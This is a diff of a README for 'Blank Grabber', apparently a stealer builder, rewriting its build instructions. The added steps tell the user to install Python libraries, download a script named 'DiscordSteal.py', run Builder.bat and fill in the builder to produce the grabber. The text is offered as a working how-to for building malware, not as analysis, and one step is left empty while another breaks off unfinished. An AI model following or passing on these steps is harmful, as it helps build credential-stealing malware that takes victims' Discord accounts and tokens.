@@ -99,13 +99,16 @@ Blank-c
 ## How to Build?
 
 1. Download and install [Python 3](https://www.python.org/downloads/release/python-3109/) (Make sure to enable the *Add to PATH* option.)
-2. Download in CMD [pip install pycryptodome] [pip install requests] [pip install pywin32]
-                                                
-
-3. 
-4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
-6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+2.    Download in CMD
+3.     pip install pycryptodome
+4.     pip install requests
+5.     pip install pywin32
+6. Next, download DiscordSteal.py and place it on the desktop.
+7. Go back to CMD and specify the path to the desktop
+8. 
+9. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
+10. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
+11. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
 
